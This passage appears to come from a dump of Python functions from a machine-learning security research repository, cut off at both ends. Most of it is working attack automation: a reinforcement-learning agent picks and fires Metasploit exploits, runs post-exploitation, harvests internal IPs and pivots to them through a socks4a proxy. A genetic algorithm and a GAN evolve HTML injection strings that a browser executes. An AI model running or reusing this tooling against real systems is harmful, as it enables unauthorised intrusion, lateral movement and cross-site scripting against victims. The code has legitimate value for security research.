    global plot_count
    global plot_pcount
    if self.thread_type == 'test':
        self.util.print_message(NOTE, 'Execute exploitation.')
        session_list = []
        for port_num in com_port_list:
            execute_list = []
            target_info = {}
            module_list = target_tree[port_num]['exploit']
            for exploit in module_list:
                target_list = exploit_tree[exploit[8:]]['target_list']
                for target in target_list:
                    (skip_flag, s, payload_list, target_info) = self.env.get_state(exploit_tree, target_tree, port_num, exploit, target)
                    if skip_flag is False:
                        available_actions = self.env.get_available_actions(payload_list)
                        frames = self.env.eps_steps
                        (_, _, p_list) = self.agent.act(s, available_actions, self.env.eps_steps)
                        if p_list is not None:
                            for prob in p_list:
                                execute_list.append([prob[1], exploit, target, prob[0], target_info])
                    else:
                        continue
            execute_list.sort(key=lambda s: -s[0])
            for (idx, exe_info) in enumerate(execute_list):
                (_, _, done, sess_info) = self.env.execute_exploit(exe_info[3], self.name, self.thread_type, exe_info[2], exe_info[4], idx, exploit_tree)
                if len(sess_info) != 0:
                    session_list.append(sess_info)
                if done is True:
                    break
        new_target_list = []
        for session in session_list:
            self.util.print_message(NOTE, 'Execute post exploitation.')
            self.util.print_message(OK, 'Target session info.\n    session id   : {0}\n    session type : {1}\n    target port  : {2}\n    exploit      : {3}\n    target       : {4}\n    payload      : {5}'.format(session['id'], session['type'], session['port'], session['exploit'], session['target'], session['payload']))
            internal_ip_list = self.env.execute_post_exploit(session['id'], session['type'])
            for ip_addr in internal_ip_list:
                if ip_addr not in self.env.prohibited_list and ip_addr != self.env.rhost:
                    new_target_list.append(ip_addr)
                else:
                    self.util.print_message(WARNING, 'Target IP={} is prohibited.'.format(ip_addr))
        new_target_list = list(set(new_target_list))
        if len(new_target_list) != 0:
            module = 'auxiliary/server/socks4a'
            self.util.print_message(NOTE, 'Set proxychains: SRVHOST={}, SRVPORT={}'.format(self.env.proxy_host, str(self.env.proxy_port)))
            option = {'SRVHOST': self.env.proxy_host, 'SRVPORT': self.env.proxy_port}
            (job_id, uuid) = self.env.client.execute_module('auxiliary', module, option)
            if uuid is None:
                self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
                isFinish = True
                return
            self.env.source_host = self.env.rhost
            self.env.prohibited_list.append(self.env.rhost)
            self.env.isPostExploit = True
            self.deep_run(new_target_list)
        isFinish = True
    else:
        (skip_flag, s, payload_list, target_list, target_info) = self.env.reset_state(exploit_tree, target_tree)
        if skip_flag is False:
            R = 0
            step = 0
            while True:
                available_actions = self.env.get_available_actions(payload_list)
                (a, _, _) = self.agent.act(s, available_actions, self.env.eps_steps)
                (s_, r, done, _) = self.env.execute_exploit(a, self.name, self.thread_type, target_list, target_info, step, exploit_tree, frames)
                step += 1
                payload_list = exploit_tree[target_info['exploit']]['targets'][str(self.env.state[ST_TARGET])]
                if step > MAX_STEPS:
                    done = True
                frames += 1
                if r == R_GOOD:
                    exploit_count += 1
                if r == R_GREAT:
                    exploit_count += 1
                    post_exploit_count += 1
                if frames % 100 == 0:
                    self.util.print_message(NOTE, 'Plot number of successful post-exploitation.')
                    plot_count.append(exploit_count)
                    plot_pcount.append(post_exploit_count)
                    exploit_count = 0
                    post_exploit_count = 0
                if a == 'no payload':
                    a = len(com_payload_list) - 1
                self.agent.advantage_push_local_brain(s, a, r, s_)
                s = s_
                R += r
                if done or step % Tmax == 0:
                    if not isFinish:
                        self.agent.brain.update_parameter_server()
                        self.agent.brain.pull_parameter_server()
                if done:
                    self.total_reward_vec = np.hstack((self.total_reward_vec[1:], step))
                    self.count_trial_each_thread += 1
                    break
            self.util.print_message(OK, 'Thread: {}, Trial num: {}, Step: {}, Avg step: {}'.format(self.name, str(self.count_trial_each_thread), str(step), str(self.total_reward_vec.mean())))
            if frames > MAX_TRAIN_NUM:
                self.util.print_message(OK, 'Finish train:{}'.format(self.name))
                isFinish = True
                self.util.print_message(OK, 'Stopping learning...')
                time.sleep(30.0)
                self.agent.brain.push_parameter_server()"
13o-bbr-bbq/machine_learning_security,deep_run,"def deep_run(self, target_ip_list):
    for target_ip in target_ip_list:
        result_file = 'nmap_result_' + target_ip + '.xml'
        command = self.env.nmap_2nd_command + ' ' + result_file + ' ' + target_ip + '\n'
        self.env.execute_nmap(target_ip, command, self.env.nmap_2nd_timeout)
        (com_port_list, proto_list, info_list) = self.env.get_port_list(result_file, target_ip)
        exploit_tree = self.env.get_exploit_tree()
        target_tree = self.env.get_target_info(target_ip, proto_list, info_list)
        self.env.rhost = target_ip
        self.run(exploit_tree, target_tree)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, thread_name, thread_type, parameter_server, rhost):
    self.environment = Environment(thread_name, thread_type, parameter_server, rhost)
    self.thread_name = thread_name
    self.thread_type = thread_type
    self.util = Utilty()"
13o-bbr-bbq/machine_learning_security,run,"def run(self, exploit_tree, target_tree, saver=None, train_path=None):
    self.util.print_message(NOTE, 'Executing start: {}'.format(self.thread_name))
    while True:
        if self.thread_type == 'learning':
            self.environment.run(exploit_tree, target_tree)
            if isFinish:
                self.util.print_message(OK, 'Finish train: {}'.format(self.thread_name))
                time.sleep(3.0)
                self.util.print_message(OK, 'Save learned data: {}'.format(self.thread_name))
                saver.save(SESS, train_path)
                self.environment.env.client.termination(self.environment.env.client.console_id)
                if self.thread_name == 'local_thread1':
                    df_plot = pd.DataFrame({'exploitation': plot_count, 'post-exploitation': plot_pcount})
                    df_plot.to_csv(os.path.join(self.environment.env.data_path, 'experiment.csv'))
                    report = CreateReport()
                    report.create_report('train', pd.to_datetime(self.environment.env.scan_start_time))
                break
        else:
            self.environment.run(exploit_tree, target_tree)
            if isFinish:
                self.util.print_message(OK, 'Finish test.')
                time.sleep(3.0)
                self.environment.env.client.termination(self.environment.env.client.console_id)
                report = CreateReport()
                report.create_report('test', pd.to_datetime(self.environment.env.scan_start_time))
                break"
13o-bbr-bbq/machine_learning_security,get_sample,"def get_sample(memory, n):
    (s, a, _, _) = memory[0]
    (_, _, _, s_) = memory[n - 1]
    return (s, a, self.R, s_)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, category=None, *args, **kwargs):
    super(SimpleSpider, self).__init__(*args, **kwargs)
    self.start_urls = getattr(self, 'target_url', None)
    self.allowed_domains = [getattr(self, 'allow_domain', None)]
    self.concurrent = int(getattr(self, 'concurrent', None))
    self.depth_limit = int(getattr(self, 'depth_limit', None))
    self.delay_time = float(getattr(self, 'delay', None))
    self.store_path = getattr(self, 'store_path', None)
    self.response_log = getattr(self, 'response_log', None)
    msgrpc_host = getattr(self, 'msgrpc_host', None)
    msgrpc_port = int(getattr(self, 'msgrpc_port', None))
    self.client = Msgrpc({'host': msgrpc_host, 'port': msgrpc_port})
    self.client.console_id = getattr(self, 'msgrpc_console_id', None).encode('utf-8')
    self.client.token = getattr(self, 'msgrpc_token', None).encode('utf-8')
    self.client.authenticated = True
    self.custom_settings = {'CONCURRENT_REQUESTS': self.concurrent, 'CONCURRENT_REQUESTS_PER_DOMAIN': self.concurrent, 'DEPTH_LIMIT ': self.depth_limit, 'DOWNLOAD_DELAY': self.delay_time, 'ROBOTSTXT_OBEY': True, 'HTTPCACHE_ENABLED': True, 'HTTPCACHE_EXPIRATION_SECS': 60 * 60 * 24, 'HTTPCACHE_DIR': self.store_path, 'FEED_EXPORT_ENCODING': 'utf-8'}
    log_file = os.path.join(self.store_path, self.response_log)
    self.fout = codecs.open(log_file, 'w', encoding='utf-8')
    Utilty().print_message('ok', 'Save log to {}'.format(log_file))"
13o-bbr-bbq/machine_learning_security,start_requests,"def start_requests(self):
    self.client.keep_alive()
    url = self.start_urls
    yield Request(url, self.parse)"
13o-bbr-bbq/machine_learning_security,parse,"def parse(self, response):
    self.fout.write(response.body.decode('utf-8'))
    for href in response.css('a::attr(href)'):
        full_url = response.urljoin(href.extract())
        time.sleep(self.delay_time)
        yield scrapy.Request(full_url, callback=self.parse_item)
    for src in response.css('script::attr(src)'):
        full_url = response.urljoin(src.extract())
        time.sleep(self.delay_time)
        yield scrapy.Request(full_url, callback=self.parse_item)"
13o-bbr-bbq/machine_learning_security,parse_item,"def parse_item(self, response):
    self.client.keep_alive()
    urls = []
    self.fout.write(response.body.decode('utf-8'))
    for href in response.css('a::attr(href)'):
        full_url = response.urljoin(href.extract())
        urls.append(full_url)
    for src in response.css('script::attr(src)'):
        full_url = response.urljoin(src.extract())
        urls.append(full_url)
    yield {'urls': urls}"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.print_message(FAIL, 'File exists error: {}'.format(err))
        sys.exit(1)
    self.http_timeout = float(config['Utility']['http_timeout'])
    self.max_target_url = int(config['Utility']['max_target_url'])
    self.max_target_byte = int(config['Utility']['max_target_byte'])
    if int(config['Utility']['scramble']) == 1:
        self.is_scramble = True
    self.report_date_format = str(config['Report']['date_format'])
    self.output_base_path = config['Spider']['output_base_path']
    self.store_path = os.path.join(full_path, self.output_base_path)
    if os.path.exists(self.store_path) is False:
        os.mkdir(self.store_path)
    self.output_filename = config['Spider']['output_filename']
    self.spider_concurrent_reqs = config['Spider']['concurrent_reqs']
    self.spider_depth_limit = config['Spider']['depth_limit']
    self.spider_delay_time = config['Spider']['delay_time']
    self.spider_time_out = config['Spider']['time_out']
    self.spider_item_count = config['Spider']['item_count']
    self.spider_page_count = config['Spider']['page_count']
    self.spider_error_count = config['Spider']['error_count']"
13o-bbr-bbq/machine_learning_security,print_message,"def print_message(self, type, message):
    if os.name == 'nt':
        if type == NOTE:
            print('[+] ' + message)
        elif type == FAIL:
            print('[-] ' + message)
        elif type == WARNING:
            print('[!] ' + message)
        elif type == NONE:
            print(message)
        else:
            print('[*] ' + message)
    elif type == NOTE:
        print(PRINT_NOTE + ' ' + message)
    elif type == FAIL:
        print(PRINT_FAIL + ' ' + message)
    elif type == WARNING:
        print(PRINT_WARN + ' ' + message)
    elif type == NONE:
        print(NOTE_GREEN + message + ENDC)
    else:
        print(PRINT_OK + ' ' + message)"
13o-bbr-bbq/machine_learning_security,print_exception,"def print_exception(self, e, message):
    self.print_message(WARNING, 'type:{}'.format(type(e)))
    self.print_message(WARNING, 'args:{}'.format(e.args))
    self.print_message(WARNING, '{}'.format(e))
    self.print_message(WARNING, message)"
13o-bbr-bbq/machine_learning_security,get_random_token,"def get_random_token(self, length):
    chars = string.digits + string.ascii_letters
    return ''.join([random.choice(chars) for _ in range(length)])"
13o-bbr-bbq/machine_learning_security,get_current_date,"def get_current_date(self, indicate_format=None):
    if indicate_format is not None:
        date_format = indicate_format
    else:
        date_format = self.report_date_format
    return datetime.now().strftime(date_format)"
13o-bbr-bbq/machine_learning_security,transform_date_object,"def transform_date_object(self, target_date):
    return datetime.strptime(target_date, self.report_date_format)"
13o-bbr-bbq/machine_learning_security,transform_date_string,"def transform_date_string(self, target_date):
    return target_date.strftime(self.report_date_format)"
13o-bbr-bbq/machine_learning_security,delete_ctrl_char,"def delete_ctrl_char(self, origin_text):
    clean_text = ''
    for char in origin_text:
        ord_num = ord(char)
        if (ord_num == 10 or ord_num == 13) or 32 <= ord_num <= 126:
            clean_text += chr(ord_num)
    return clean_text"
13o-bbr-bbq/machine_learning_security,check_web_port,"def check_web_port(self, target_ip, port_list, client):
    self.print_message(NOTE, 'Check web port.')
    web_port_list = []
    for port_num in port_list:
        http = urllib3.PoolManager(timeout=self.http_timeout)
        for scheme in ['http://', 'https://']:
            target_url = scheme + target_ip + ':' + port_num
            try:
                client.keep_alive()
                self.print_message(OK, 'Target URL: {}'.format(target_url))
                res = http.request('GET', target_url)
                self.print_message(OK, 'Port ""{}"" is web port. status={}'.format(port_num, res.status))
                web_port_list.append([port_num, scheme])
                break
            except Exception as e:
                self.print_message(WARNING, 'Port ""{}"" is not web port.'.format(port_num))
    return web_port_list"
13o-bbr-bbq/machine_learning_security,send_request,"def send_request(self, method, target_url):
    res_header = ''
    res_body = ''
    res = None
    http = urllib3.PoolManager(timeout=self.http_timeout)
    try:
        res = http.request(method, target_url)
        for header in res.headers.items():
            res_header += header[0] + ': ' + header[1] + '\r\n'
        res_body = '\r\n\r\n' + res.data.decode('utf-8')
    except Exception as e:
        self.print_exception(e, 'Access is failure : {}'.format(target_url))
    return (res, res_header, res_body)"
13o-bbr-bbq/machine_learning_security,parse_url,"def parse_url(self, url):
    parsed = None
    try:
        parsed = util.parse_url(url)
    except Exception as e:
        self.util.print_exception(e, 'Parsed error : {}'.format(url))
    return parsed"
13o-bbr-bbq/machine_learning_security,run_spider,"def run_spider(self, target_ip, target_web, client):
    all_targets_log = []
    for target_info in target_web:
        target_url = target_info[1] + target_ip + ':' + target_info[0] + '/'
        target_log = [target_url]
        response_log = target_ip + '_' + target_info[0] + '.log'
        now_time = self.get_current_date('%Y%m%d%H%M%S')
        result_file = os.path.join(self.output_base_path, now_time + self.output_filename)
        option = ' -a target_url=' + target_url + ' -a allow_domain=' + target_ip + ' -a concurrent=' + self.spider_concurrent_reqs + ' -a depth_limit=' + self.spider_depth_limit + ' -a delay=' + self.spider_delay_time + ' -a store_path=' + self.store_path + ' -a response_log=' + response_log + ' -a msgrpc_host=' + client.host + ' -a msgrpc_port=' + str(client.port) + ' -a msgrpc_token=' + client.token.decode('utf-8') + ' -a msgrpc_console_id=' + client.console_id.decode('utf-8') + ' -o ' + result_file
        close_opton = ' -s CLOSESPIDER_TIMEOUT=' + self.spider_time_out + ' -s CLOSESPIDER_ITEMCOUNT=' + self.spider_item_count + ' -s CLOSESPIDER_PAGECOUNT=' + self.spider_page_count + ' -s CLOSESPIDER_ERRORCOUNT=' + self.spider_error_count + ' '
        command = 'scrapy runspider' + close_opton + 'Spider.py' + option
        proc = Popen(command, shell=True)
        proc.wait()
        dict_json = {}
        if os.path.exists(result_file):
            with codecs.open(result_file, 'r', encoding='utf-8') as fin:
                target_text = self.delete_ctrl_char(fin.read())
                if target_text != '':
                    dict_json = json.loads(target_text)
                else:
                    self.print_message(WARNING, '[{}] is empty.'.format(result_file))
        for idx in range(len(dict_json)):
            items = dict_json[idx]['urls']
            for item in items:
                try:
                    if target_ip == util.parse_url(item).host:
                        target_log.append(item)
                except Exception as err:
                    self.print_exception(err, 'Parsed error: {}'.format(item))
        all_targets_log.append([target_url, os.path.join(self.store_path, response_log), list(set(target_log))])
    return all_targets_log"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, genom_list, evaluation):
    self.genom_list = genom_list
    self.evaluation = evaluation"
13o-bbr-bbq/machine_learning_security,getGenom,"def getGenom(self):
    return self.genom_list"
13o-bbr-bbq/machine_learning_security,getEvaluation,"def getEvaluation(self):
    return self.evaluation"
13o-bbr-bbq/machine_learning_security,setGenom,"def setGenom(self, genom_list):
    self.genom_list = genom_list"
13o-bbr-bbq/machine_learning_security,setEvaluation,"def setEvaluation(self, evaluation):
    self.evaluation = evaluation"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, template, browser):
    self.util = Utilty()
    self.template = template
    self.obj_browser = browser
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(self.util.join_path(full_path, 'config.ini'))
    except FileExistsError as e:
        self.util.print_message(FAIL, 'File exists error: {}'.format(e))
        sys.exit(1)
    self.wait_time = float(config['Common']['wait_time'])
    self.html_dir = self.util.join_path(full_path, config['Common']['html_dir'])
    self.html_template = config['Common']['html_template']
    self.html_template_path = self.util.join_path(self.html_dir, self.html_template)
    self.html_file = config['Common']['ga_html_file']
    self.result_dir = self.util.join_path(full_path, config['Common']['result_dir'])
    self.genom_length = int(config['Genetic']['genom_length'])
    self.max_genom_list = int(config['Genetic']['max_genom_list'])
    self.select_genom = int(config['Genetic']['select_genom'])
    self.individual_mutation_rate = float(config['Genetic']['individual_mutation_rate'])
    self.genom_mutation_rate = float(config['Genetic']['genom_mutation_rate'])
    self.max_generation = int(config['Genetic']['max_generation'])
    self.max_fitness = int(config['Genetic']['max_fitness'])
    self.gene_dir = self.util.join_path(full_path, config['Genetic']['gene_dir'])
    self.genes_path = self.util.join_path(self.gene_dir, config['Genetic']['gene_file'])
    html_checker_dir = self.util.join_path(full_path, config['Genetic']['html_checker_dir'])
    self.html_checker = self.util.join_path(html_checker_dir, config['Genetic']['html_checker_file'])
    self.html_checker_option = config['Genetic']['html_checker_option']
    self.html_checked_path = self.util.join_path(self.html_dir, config['Genetic']['html_checked_file'])
    self.html_eval_place_list = config['Genetic']['html_eval_place'].split('@')
    self.bingo_score = float(config['Genetic']['bingo_score'])
    self.warning_score = float(config['Genetic']['warning_score'])
    self.error_score = float(config['Genetic']['error_score'])
    self.result_file = config['Genetic']['result_file']
    self.result_list = []"
13o-bbr-bbq/machine_learning_security,create_genom,"def create_genom(self, df_gene):
    lst_gene = []
    for _ in range(self.genom_length):
        lst_gene.append(random.randint(0, len(df_gene.index) - 1))
    self.util.print_message(OK, 'Created individual : {}.'.format(lst_gene))
    return Gene(lst_gene, 0)"
13o-bbr-bbq/machine_learning_security,evaluation,"def evaluation(self, obj_ga, df_gene, eval_place, individual_idx):
    indivisual = self.util.transform_gene_num2str(df_gene, obj_ga.genom_list)
    html = self.template.render({eval_place: indivisual})
    eval_html_path = self.util.join_path(self.html_dir, self.html_file.replace('*', str(individual_idx)))
    with codecs.open(eval_html_path, 'w', encoding='utf-8') as fout:
        fout.write(html)
    command = self.html_checker + ' ' + self.html_checker_option + ' ' + self.html_checked_path + ' ' + eval_html_path
    enc = locale.getpreferredencoding()
    env_tmp = os.environ.copy()
    env_tmp['PYTHONIOENCODING'] = enc
    subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env_tmp)
    str_eval_result = ''
    with codecs.open(self.html_checked_path, 'r', encoding='utf-8') as fin:
        str_eval_result = fin.read()
    str_pattern = '.*Tidy found ([0-9]+) warnings and ([0-9]+) errors.*$'
    obj_match = re.match(str_pattern, str_eval_result.replace('\t', '').replace('\r', '').replace('\n', ''))
    warnings = 0.0
    errors = 0.0
    if obj_match:
        warnings = int(obj_match.group(1)) * -0.1
        errors = int(obj_match.group(2)) * -1.0
    else:
        return (None, 1)
    int_score = warnings + errors
    (selenium_score, error_flag) = self.util.check_individual_selenium(self.obj_browser, eval_html_path)
    if error_flag:
        return (None, 1)
    if selenium_score > 0:
        self.util.print_message(OK, 'Detect running script: ""{}"" in {}.'.format(indivisual, eval_place))
        int_score += self.bingo_score
        self.result_list.append([eval_place, obj_ga.genom_list, indivisual])
        self.util.print_message(OK, 'Evaluation result : Browser={} {}, Individual=""{} ({})"", Score={}'.format(self.obj_browser.name, self.obj_browser.capabilities['version'], indivisual, obj_ga.genom_list, str(int_score)))
    return (int_score, 0)"
13o-bbr-bbq/machine_learning_security,select,"def select(self, obj_ga, elite):
    sort_result = sorted(obj_ga, reverse=True, key=lambda u: u.evaluation)
    return [sort_result.pop(0) for _ in range(elite)]"
13o-bbr-bbq/machine_learning_security,crossover,"def crossover(self, ga_first, ga_second):
    genom_list = []
    cross_first = random.randint(0, self.genom_length)
    cross_second = random.randint(cross_first, self.genom_length)
    one = ga_first.getGenom()
    second = ga_second.getGenom()
    progeny_one = one[:cross_first] + second[cross_first:cross_second] + one[cross_second:]
    progeny_second = second[:cross_first] + one[cross_first:cross_second] + second[cross_second:]
    genom_list.append(Gene(progeny_one, 0))
    genom_list.append(Gene(progeny_second, 0))
    return genom_list"
13o-bbr-bbq/machine_learning_security,next_generation_gene_create,"def next_generation_gene_create(self, ga, ga_elite, ga_progeny):
    next_generation_geno = sorted(ga, reverse=False, key=lambda u: u.evaluation)
    for _ in range(0, len(ga_elite) + len(ga_progeny)):
        next_generation_geno.pop(0)
    next_generation_geno.extend(ga_elite)
    next_generation_geno.extend(ga_progeny)
    return next_generation_geno"
13o-bbr-bbq/machine_learning_security,mutation,"def mutation(self, obj_ga, induvidual_mutation, genom_mutation, df_genes):
    lst_ga = []
    for idx in obj_ga:
        if induvidual_mutation > random.randint(0, 100) / Decimal(100):
            lst_gene = []
            for idx2 in idx.getGenom():
                if genom_mutation > random.randint(0, 100) / Decimal(100):
                    lst_gene.append(random.randint(0, len(df_genes.index) - 1))
                else:
                    lst_gene.append(idx2)
            idx.setGenom(lst_gene)
            lst_ga.append(idx)
        else:
            lst_ga.append(idx)
    return lst_ga"
13o-bbr-bbq/machine_learning_security,main,"def main(self):
    df_genes = pd.read_csv(self.genes_path, encoding='utf-8').fillna('')
    save_path = self.util.join_path(self.result_dir, self.result_file.replace('*', self.obj_browser.name))
    if os.path.exists(save_path) is False:
        pd.DataFrame([], columns=['eval_place', 'sig_vector', 'sig_string']).to_csv(save_path, mode='w', header=True, index=False)
    for eval_place in self.html_eval_place_list:
        self.util.print_message(NOTE, 'Evaluating html place : {}'.format(eval_place))
        self.util.print_message(NOTE, 'Create population.')
        current_generation = []
        for _ in range(self.max_genom_list):
            current_generation.append(self.create_genom(df_genes))
        for int_count in range(1, self.max_generation + 1):
            self.util.print_message(NOTE, 'Evaluate individual : {}/{} generation.'.format(str(int_count), self.max_generation))
            for (indivisual, idx) in enumerate(range(self.max_genom_list)):
                self.util.print_message(OK, 'Evaluation individual in {}: {}/{} in {} generation'.format(eval_place, indivisual + 1, self.max_genom_list, str(int_count)))
                (evaluation_result, eval_status) = self.evaluation(current_generation[indivisual], df_genes, eval_place, idx)
                idx += 1
                if eval_status == 1:
                    indivisual -= 1
                    continue
                current_generation[indivisual].setEvaluation(evaluation_result)
                time.sleep(self.wait_time)
            elite_genes = self.select(current_generation, self.select_genom)
            progeny_gene = []
            for i in range(0, self.select_genom):
                progeny_gene.extend(self.crossover(elite_genes[i - 1], elite_genes[i]))
            next_generation_individual_group = self.next_generation_gene_create(current_generation, elite_genes, progeny_gene)
            next_generation_individual_group = self.mutation(next_generation_individual_group, self.individual_mutation_rate, self.genom_mutation_rate, df_genes)
            fits = [_.getEvaluation() for _ in current_generation]
            flt_avg = sum(fits) / float(len(fits))
            self.util.print_message(NOTE, '{} generation result: Min={}, Max={}, Avg={}.'.format(int_count, min(fits), max(fits), flt_avg))
            if flt_avg > self.max_fitness:
                self.util.print_message(NOTE, 'Finish evolution: average={}'.format(str(flt_avg)))
                break
            current_generation = next_generation_individual_group
    pd.DataFrame(self.result_list).to_csv(save_path, mode='a', header=True, index=False)
    str_best_individual = ''
    for gene_num in elite_genes[0].getGenom():
        str_best_individual += str(df_genes.loc[gene_num].values[0])
    str_best_individual = str_best_individual.replace('%s', ' ').replace('&quot;', '""').replace('%comma', ',')
    self.util.print_message(NOTE, 'Best individual : ""{}""'.format(str_best_individual))
    self.util.print_message(NOTE, 'Done creation of injection codes using Genetic Algorithm.')
    return self.result_list"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, template, browser):
    self.util = Utilty()
    self.template = template
    self.obj_browser = browser
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(self.util.join_path(full_path, 'config.ini'))
    except FileExistsError as e:
        self.util.print_message(FAIL, 'File exists error: {}'.format(e))
        sys.exit(1)
    self.wait_time = float(config['Common']['wait_time'])
    self.html_dir = self.util.join_path(full_path, config['Common']['html_dir'])
    self.html_file = config['Common']['gan_html_file']
    self.result_dir = self.util.join_path(full_path, config['Common']['result_dir'])
    self.eval_html_path = self.util.join_path(self.html_dir, self.html_file)
    self.genom_length = int(config['Genetic']['genom_length'])
    self.gene_dir = self.util.join_path(full_path, config['Genetic']['gene_dir'])
    self.genes_path = self.util.join_path(self.gene_dir, config['Genetic']['gene_file'])
    self.ga_result_file = config['Genetic']['result_file']
    self.eval_place_list = config['Genetic']['html_eval_place'].split('@')
    self.input_size = int(config['GAN']['input_size'])
    self.batch_size = int(config['GAN']['batch_size'])
    self.num_epoch = int(config['GAN']['num_epoch'])
    self.max_sig_num = int(config['GAN']['max_sig_num'])
    self.max_explore_codes_num = int(config['GAN']['max_explore_codes_num'])
    self.max_synthetic_num = int(config['GAN']['max_synthetic_num'])
    self.weight_dir = self.util.join_path(full_path, config['GAN']['weight_dir'])
    self.gen_weight_file = config['GAN']['generator_weight_file']
    self.dis_weight_file = config['GAN']['discriminator_weight_file']
    self.gan_result_file = config['GAN']['result_file']
    self.gan_vec_result_file = config['GAN']['vec_result_file']
    self.generator = None
    self.df_genes = pd.read_csv(self.genes_path, encoding='utf-8').fillna('')
    self.flt_size = len(self.df_genes) / 2.0
    self.weight_path = self.util.join_path(self.weight_dir, self.gen_weight_file.replace('*', str(self.num_epoch - 1)))"
13o-bbr-bbq/machine_learning_security,generator_model,"def generator_model(self):
    model = Sequential()
    model.add(Dense(input_dim=self.input_size, output_dim=self.input_size * 10, init='glorot_uniform'))
    model.add(LeakyReLU(0.2))
    model.add(Dropout(0.5))
    model.add(Dense(self.input_size * 10, init='glorot_uniform'))
    model.add(LeakyReLU(0.2))
    model.add(Dropout(0.5))
    model.add(Dense(self.input_size * 5, init='glorot_uniform'))
    model.add(LeakyReLU(0.2))
    model.add(Dropout(0.5))
    model.add(Dense(output_dim=self.genom_length, init='glorot_uniform'))
    model.add(Activation('tanh'))
    return model"
13o-bbr-bbq/machine_learning_security,discriminator_model,"def discriminator_model(self):
    model = Sequential()
    model.add(Dense(input_dim=self.genom_length, output_dim=self.genom_length * 10, init='glorot_uniform'))
    model.add(LeakyReLU(0.2))
    model.add(Dense(self.genom_length * 10, init='glorot_uniform'))
    model.add(LeakyReLU(0.2))
    model.add(Dense(1, init='glorot_uniform'))
    model.add(Activation('sigmoid'))
    return model"
13o-bbr-bbq/machine_learning_security,train,"def train(self, list_sigs):
    X_train = []
    X_train = np.array(list_sigs)
    X_train = (X_train.astype(np.float32) - self.flt_size) / self.flt_size
    discriminator = self.discriminator_model()
    d_opt = SGD(lr=0.1, momentum=0.1, decay=1e-05)
    discriminator.compile(loss='binary_crossentropy', optimizer=d_opt)
    discriminator.trainable = False
    self.generator = self.generator_model()
    dcgan = Sequential([self.generator, discriminator])
    g_opt = SGD(lr=0.1, momentum=0.3)
    dcgan.compile(loss='binary_crossentropy', optimizer=g_opt)
    num_batches = int(len(X_train) / self.batch_size)
    lst_scripts = []
    for epoch in range(self.num_epoch):
        for batch in range(num_batches):
            noise = np.array([np.random.uniform(-1, 1, self.input_size) for _ in range(self.batch_size)])
            generated_codes = self.generator.predict(noise, verbose=0)
            image_batch = X_train[batch * self.batch_size:(batch + 1) * self.batch_size]
            X = image_batch
            y = [random.uniform(0.7, 1.2) for _ in range(self.batch_size)]
            d_loss = discriminator.train_on_batch(X, y)
            X = generated_codes
            y = [random.uniform(0.0, 0.3) for _ in range(self.batch_size)]
            d_loss = discriminator.train_on_batch(X, y)
            noise = np.array([np.random.uniform(-1, 1, self.input_size) for _ in range(self.batch_size)])
            g_loss = dcgan.train_on_batch(noise, [1] * self.batch_size)
            for generated_code in generated_codes:
                lst_genom = []
                for gene_num in generated_code:
                    gene_num = gene_num * self.flt_size + self.flt_size
                    gene_num = int(np.round(gene_num))
                    if gene_num == len(self.df_genes):
                        gene_num -= 1
                    lst_genom.append(int(gene_num))
                str_html = self.util.transform_gene_num2str(self.df_genes, lst_genom)
                self.util.print_message(OK, 'Train GAN : epoch={}, batch={}, g_loss={}, d_loss={}, {} ({})'.format(epoch, batch, g_loss, d_loss, np.round(generated_code * self.flt_size + self.flt_size), str_html))
                for eval_place in self.eval_place_list:
                    html = self.template.render({eval_place: str_html})
                    with codecs.open(self.eval_html_path, 'w', encoding='utf-8') as fout:
                        fout.write(html)
                    (selenium_score, error_flag) = self.util.check_individual_selenium(self.obj_browser, self.eval_html_path)
                    if error_flag:
                        continue
                    if selenium_score > 0:
                        self.util.print_message(WARNING, 'Detect running script: ""{}"" in {}.'.format(str_html, eval_place))
                        lst_scripts.append([eval_place, str_html])
        self.generator.save_weights(self.util.join_path(self.weight_dir, self.gen_weight_file.replace('*', str(epoch))))
        discriminator.save_weights(self.util.join_path(self.weight_dir, self.dis_weight_file.replace('*', str(epoch))))
    return lst_scripts"
13o-bbr-bbq/machine_learning_security,transform_code2gene,"def transform_code2gene(self, generated_code):
    lst_genom = []
    for gene_num in generated_code:
        gene_num = gene_num * self.flt_size + self.flt_size
        gene_num = int(np.round(gene_num))
        if gene_num == len(self.df_genes):
            gene_num -= 1
        lst_genom.append(int(gene_num))
    return lst_genom"
13o-bbr-bbq/machine_learning_security,vector_mean,"def vector_mean(self, vector1, vector2):
    return (vector1 + vector2) / 2"
13o-bbr-bbq/machine_learning_security,main,"def main(self):
    gan_save_path = self.util.join_path(self.result_dir, self.gan_result_file.replace('*', self.obj_browser.name))
    vec_save_path = self.util.join_path(self.result_dir, self.gan_vec_result_file.replace('*', self.obj_browser.name))
    if os.path.exists(self.weight_path):
        self.generator = self.generator_model()
        self.generator.load_weights('{}'.format(self.weight_path))
        valid_code_list = []
        result_list = []
        for idx in range(self.max_explore_codes_num):
            self.util.print_message(NOTE, '{}/{} Explore valid injection code.'.format(idx + 1, self.max_explore_codes_num))
            noise = np.array([np.random.uniform(-1, 1, self.input_size) for _ in range(1)])
            generated_codes = self.generator.predict(noise, verbose=0)
            str_html = self.util.transform_gene_num2str(self.df_genes, self.transform_code2gene(generated_codes[0]))
            for eval_place in self.eval_place_list:
                html = self.template.render({eval_place: str_html})
                with codecs.open(self.eval_html_path, 'w', encoding='utf-8') as fout:
                    fout.write(html)
                (selenium_score, error_flag) = self.util.check_individual_selenium(self.obj_browser, self.eval_html_path)
                if error_flag:
                    continue
                if selenium_score > 0:
                    self.util.print_message(WARNING, 'Find valid injection code: ""{}"" in {}.'.format(str_html, eval_place))
                    valid_code_list.append([str_html, noise])
                    result_list.append([eval_place, str_html])
        if os.path.exists(gan_save_path) is False:
